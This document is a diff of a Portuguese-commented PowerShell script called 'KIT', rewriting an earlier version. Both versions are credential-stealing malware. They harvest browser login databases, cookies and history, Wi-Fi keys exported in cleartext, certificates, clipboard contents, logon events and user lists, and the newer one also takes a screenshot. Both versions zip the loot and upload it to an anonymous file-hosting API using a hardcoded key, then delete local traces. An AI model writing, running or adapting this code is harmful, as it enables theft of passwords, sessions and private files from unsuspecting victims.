@@ -1,95 +1,95 @@
-# KIT v7.5-ZIP  –  PS 5.1/7 cross-compatível  –  upload AnonFiles
-$ErrorActionPreference = 'SilentlyContinue'
-Add-Type -AssemblyName System.IO.Compression.FileSystem
+# ----------
+# KIT v3 – AnonFiles Edition (sem elevação, sem áudio)
+# ----------
+$kit = "$env:TEMP\kit"
+$key = "AFtru5qQZX8HN5npouThcNDJtVbe6d"      # chave anonfiles
+$upload = "https://api.anonfilesnew.com/upload?key=$key"
 
-$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
-$work  = "$env:TEMP\kit_$stamp"
-$zip   = "$env:TEMP\kit_$stamp.zip"
-[void][IO.Directory]::CreateDirectory($work)
+New-Item -ItemType Directory -Path $kit -Force | Out-Null
 
-function Out-Kit ($name, $obj) {
-    $file = Join-Path $work $name
-    if ($obj -is [string]) { $obj | Set-Content $file -Encoding UTF8 }
-    else { $obj | ConvertTo-Json -Depth 5 -Compress | Set-Content $file -Encoding UTF8 }
-}
+# 1) Sistema & HW
+systeminfo | Out-File "$kit\sysinfo.txt" -Encoding UTF8
+Get-CimInstance Win32_ComputerSystem | Out-File "$kit\hw.txt" -Encoding UTF8
+Get-CimInstance Win32_Processor | Out-File "$kit\cpu.txt" -Encoding UTF8
+Get-CimInstance Win32_BIOS | Out-File "$kit\bios.txt" -Encoding UTF8
 
-# ---------- 1) Sistema ----------
-Out-Kit '01_systeminfo.txt' (systeminfo)
-Out-Kit '02_ComputerSystem.json' (Get-CimInstance Win32_ComputerSystem)
-Out-Kit '03_Processor.json'      (Get-CimInstance Win32_Processor)
-Out-Kit '04_BIOS.json'           (Get-CimInstance Win32_BIOS)
-Out-Kit '05_NetIP.json'          (Get-NetIPConfiguration)
-Out-Kit '06_Users.json'          (Get-CimInstance Win32_UserAccount)
-Out-Kit '07_Admins.txt'          (net localgroup administradores)
-Out-Kit '08_Logon4624.json'      ( (Get-WinEvent @{LogName='Security';ID=4624;Max=100}) |
-                                   Select TimeCreated,ID,Message )
-Out-Kit '09_Clipboard.txt'       (Get-Clipboard -Raw)
+# 2) Rede & Wi-Fi
+Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
+cmd /c "netsh wlan export profile key=clear folder=$kit"
 
-# ---------- 2) Recent files ----------
-Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -File -EA 0 |
-    Select Name,LastWriteTime,Length |
-    ConvertTo-Json -Compress |
-    Set-Content (Join-Path $work '10_RecentFiles.json') -Encoding UTF8
+# 3) Contas & privilégios (sem elevação)
+Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
+net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -EA SilentlyContinue |
+    Select TimeCreated,Id,LevelDisplayName,Message |
+    Out-File "$kit\logons.txt" -Encoding UTF8
 
-# ---------- 3) Certificados ----------
-Get-ChildItem Cert:\CurrentUser\My -EA 0 |
-    Select Subject,Thumbprint,NotAfter |
-    ConvertTo-Json -Compress |
-    Set-Content (Join-Path $work '11_Certs.json') -Encoding UTF8
-
-# ---------- 4) Wi-Fi ----------
-$wifiDir = "$env:TEMP\wifi_$(Get-Random)"
-[void][IO.Directory]::CreateDirectory($wifiDir)
-netsh wlan export profile key=clear folder="$wifiDir" | Out-Null
-Get-ChildItem $wifiDir -Filter *.xml -EA 0 | %{
-    $dest = Join-Path $work ("12_WIFI_" + $_.Name)
-    [IO.File]::Copy($_.FullName, $dest)
-}
-Remove-Item $wifiDir -Recurse -Force
-
-# ---------- 5) Browsers ----------
+# 4) Navegadores – login & histórico
 @(
-    @{Name='Chrome';  P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default";   F=@('Cookies','Login Data','History','Web Data')},
-    @{Name='Edge';    P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"; F=@('Cookies','Login Data','History','Web Data')},
-    @{Name='Firefox'; P="$env:APPDATA\Mozilla\Firefox\Profiles";              F=@('cookies.sqlite','logins.json','places.sqlite','key4.db')}
-) | %{
-    $base = $_.P
-    $_.F | %{
-        $fileName = $_
-        $file = Get-ChildItem $base -Recurse -File -Name $fileName -EA 0 | Select -First 1
-        if($file){
-            $src = Join-Path $base $file
-            $dst = Join-Path $work ("13_" + $_.Name + "_" + [IO.Path]::GetFileName($src))
-            try   { Copy-Item $src $dst -Force }
-            catch { $dst += '.locked'; [Convert]::ToBase64String([IO.File]::ReadAllBytes($src)) | Set-Content $dst }
-        }
-    }
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
+    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+) | ?{ Test-Path $_ } | %{
+    Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue
 }
 
-# ---------- 6) Compactar ----------
-[IO.Compression.ZipFile]::CreateFromDirectory($work, $zip, 'Optimal', $false)
+# 5) Certificados pessoais
+Get-ChildItem Cert:\CurrentUser\My |
+    Select Subject,Thumbprint,NotAfter |
+    Out-File "$kit\mycerts.txt" -Encoding UTF8
 
-# ---------- 7) Upload AnonFiles ----------
+# 6) Clipboard atual
+Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8
+
+# 7) Arquivos recentes
+Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" |
+    Select Name,LastWriteTime |
+    Out-File "$kit\recent.txt" -Encoding UTF8
+
+# 8) Lista drives & “top 500” arquivos interessantes
+Get-PSDrive -PSProvider FileSystem | Out-File "$kit\drives.txt" -Encoding UTF8
+$exts = @("*.pdf","*.doc*","*.xls*","*.txt","*.csv","*.db","*.sqlite","*.pst")
+Get-ChildItem C:\ -Include $exts -Recurse -Depth 2 -EA SilentlyContinue |
+    Select FullName,Length,LastWriteTime |
+    Sort Length -Descending |
+    Select -First 500 |
+    Export-Csv "$kit\top_files.csv" -NoTypeInformation
+
+# 9) Screenshot
+Add-Type -AssemblyName System.Windows.Forms
+$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+$g = [System.Drawing.Graphics]::FromImage($bmp)
+$g.CopyFromScreen(0,0,0,0,$bmp.Size)
+$pathSS = "$kit\screenshot.jpg"
+$bmp.Save($pathSS, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+$g.Dispose(); $bmp.Dispose()
+
+# 10) Compacta tudo
+$zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
+Compress-Archive -Path "$kit\*" -Destination $zip -Force
+
+# 11) Faz upload para AnonFiles
 try {
-    Add-Type -AssemblyName System.Net.Http
-    $client  = New-Object System.Net.Http.HttpClient
-    $fs      = [IO.File]::OpenRead($zip)
-    $content = New-Object System.Net.Http.MultipartFormDataContent
-    $fileCnt = New-Object System.Net.Http.StreamContent($fs)
-    $content.Add($fileCnt, "file", [IO.Path]::GetFileName($zip))
+    $fileBytes = [System.IO.File]::ReadAllBytes($zip)
+    $fileEnc   = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
+    $boundary  = [System.Guid]::NewGuid().ToString()
+    $crlf      = "`r`n"
 
-    $url      = "https://api.anonfilesnew.com/upload?key=AFtru5qQZX8HN5npouThcNDJtVbe6d"
-    $response = $client.PostAsync($url, $content).Result
-    $body     = $response.Content.ReadAsStringAsync().Result
-    $json     = $body | ConvertFrom-Json
-    Write-Host "`nUpload OK – link:" -ForegroundColor Green
-    $json.data.file.url.full
-} catch {
-    Write-Host "`nUpload falhou: $($_.Exception.Message)" -ForegroundColor Red
-} finally {
-    if($fs -ne $null){ $fs.Close(); $fs.Dispose() }
-}
+    $body = (
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $zip)`"",
+        "Content-Type: application/octet-stream",
+        "",
+        $fileEnc,
+        "--$boundary--"
+    ) -join $crlf
 
-# ---------- 8) Limpar ----------
-Remove-Item $work -Recurse -Force
-Remove-Item $zip  -Force
+    $response = Invoke-RestMethod -Uri $upload -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
+    # opcional: salvar link em log local
+    $response.data.file.url.url | Out-File "$env:TEMP\anon_link.txt" -Encoding UTF8
+} catch {}
+
+# 12) Limpa só a pasta $kit
+Remove-Item $kit -Recurse -Force
